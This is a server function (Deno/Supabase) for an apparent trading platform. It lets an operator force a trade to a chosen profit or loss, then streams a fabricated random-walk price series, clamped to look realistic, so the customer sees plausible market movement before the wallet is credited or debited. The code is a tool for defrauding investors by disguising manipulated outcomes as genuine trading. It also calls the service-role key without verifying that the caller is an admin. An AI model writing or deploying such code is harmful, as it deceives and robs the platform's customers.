import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });

  try {
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, serviceKey);

    const { trade_id, forced_pnl, duration_sec, admin_id } = await req.json();

    if (!trade_id || forced_pnl === undefined || !duration_sec) {
      return new Response(JSON.stringify({ error: "Missing parameters" }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Fetch trade with asset info
    const { data: trade, error: tradeErr } = await supabase
      .from("trades")
      .select("*, assets(symbol, name)")
      .eq("id", trade_id)
      .maybeSingle();

    if (tradeErr || !trade) {
      return new Response(JSON.stringify({ error: "Trade not found" }), {
        status: 404, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (trade.status !== "open") {
      return new Response(JSON.stringify({ error: "Trade is not open" }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const entryPrice = Number(trade.entry_price);
    const currentPrice = Number(trade.current_price) || entryPrice;
    const size = Number(trade.size);
    const leverage = Number(trade.leverage);

    // Calculate realistic target price (clamped 0.3%-5% move)
    const isBuy = trade.direction === "buy";
    const isWin = forced_pnl >= 0;
    const priceGoesUp = (isBuy && isWin) || (!isBuy && !isWin);
    const realRatio = Math.abs(forced_pnl) / (size * leverage);
    const clampedRatio = Math.max(0.003, Math.min(realRatio, 0.05));
    const realisticTargetPrice = priceGoesUp
      ? currentPrice * (1 + clampedRatio)
      : currentPrice * (1 - clampedRatio);

    // Set override record
    await supabase.from("trade_overrides").upsert({
      trade_id,
      override_mode: forced_pnl >= 0 ? "force_win" : "force_loss",
      target_value: forced_pnl,
      is_active: true,
      applied_by: admin_id || null,
    }, { onConflict: "trade_id" });

    // Set initial state
    await supabase.from("trades").update({
      current_price: currentPrice,
    }).eq("id", trade_id);

    // Gradual steps
    const totalDuration = Math.max(5, duration_sec);
    const steps = Math.max(Math.round(totalDuration / 3), 4);
    const intervalMs = (totalDuration * 1000) / steps;
    const priceStep = (realisticTargetPrice - currentPrice) / steps;
    const pnlStep = forced_pnl / steps;

    // Random walk with mean reversion toward target — creates realistic ups AND downs
    let walkPrice = currentPrice;
    let walkPnl = 0;
    const priceRange = Math.abs(realisticTargetPrice - currentPrice);
    const volatility = priceRange * 0.4; // 40% of total move as volatility
    const pnlVolatility = Math.abs(forced_pnl) * 0.35;

    for (let step = 1; step <= steps; step++) {
      await new Promise((r) => setTimeout(r, intervalMs));

      // Check if trade was closed externally
      const { data: check } = await supabase
        .from("trades").select("status").eq("id", trade_id).maybeSingle();
      if (check?.status === "closed") {
        await supabase.from("trade_overrides").update({ is_active: false }).eq("trade_id", trade_id);
        return new Response(JSON.stringify({ success: true, message: "Trade already closed by client" }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const isLast = step >= steps;
      const progress = step / steps; // 0→1

      if (isLast) {
        walkPrice = realisticTargetPrice;
        walkPnl = forced_pnl;
      } else {
        // Expected position at this progress point (linear interpolation)
        const expectedPrice = currentPrice + (realisticTargetPrice - currentPrice) * progress;
        const expectedPnl = forced_pnl * progress;

        // Mean-reversion pull: stronger as we approach the end
        const pullStrength = 0.3 + 0.5 * progress; // 0.3 early → 0.8 late

        // Random shock — can be negative (pullback) or positive (surge)
        const priceShock = (Math.random() - 0.5) * 2 * volatility * (1 - progress * 0.7);
        const pnlShock = (Math.random() - 0.5) * 2 * pnlVolatility * (1 - progress * 0.7);

        // Walk = previous + shock, then pull toward expected
        walkPrice = walkPrice + priceShock;
        walkPrice = walkPrice + (expectedPrice - walkPrice) * pullStrength;

        walkPnl = walkPnl + pnlShock;
        walkPnl = walkPnl + (expectedPnl - walkPnl) * pullStrength;
      }

      const decimals = currentPrice < 1 ? 6 : 2;
      const newPrice = +walkPrice.toFixed(decimals);
      const newPnl = +walkPnl.toFixed(2);

      await supabase.from("trades").update({
        current_price: newPrice,
        pnl: newPnl,
      }).eq("id", trade_id);

      if (isLast) {
        // Close the trade
        await supabase.from("trades").update({
          status: "closed",
          closed_at: new Date().toISOString(),
          current_price: +realisticTargetPrice.toFixed(currentPrice < 1 ? 6 : 2),
          pnl: forced_pnl,
        }).eq("id", trade_id);

        // Deactivate override
        await supabase.from("trade_overrides").update({ is_active: false }).eq("trade_id", trade_id);

        // Credit/debit wallet
        const { data: wallet } = await supabase
          .from("wallets")
          .select("id, balance")
          .eq("user_id", trade.user_id)
          .eq("currency", "EUR")
          .maybeSingle();
        if (wallet) {
          await supabase.from("wallets").update({
            balance: Number(wallet.balance) + size + forced_pnl,
          }).eq("id", wallet.id);
        }
      }
    }

    return new Response(JSON.stringify({
      success: true,
      message: `Trade closed with P&L €${forced_pnl.toFixed(2)}`,
    }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
